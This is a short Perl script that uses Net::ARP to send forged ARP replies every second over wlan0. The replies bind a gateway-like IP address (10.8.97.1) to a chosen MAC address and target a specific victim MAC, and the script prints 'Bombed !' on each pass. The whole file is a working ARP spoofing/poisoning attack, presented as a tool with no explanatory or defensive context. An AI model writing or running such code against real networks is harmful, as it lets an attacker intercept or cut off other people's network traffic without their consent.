#!/usr/bin/perl -w
use Net::ARP;
use strict;
for (;;)
{
	Net::ARP::send_packet('wlan0',                 # Device
                '10.8.97.1',          # Source IP
                '0.0.0.0',          # Destination IP
                '94:db:c9:47:dc:6d',  # Source MAC
                '64:27:37:98:80:47',  # Destinaton MAC
                'reply');             # ARP operation
print("Bombed !");
sleep(1);
}
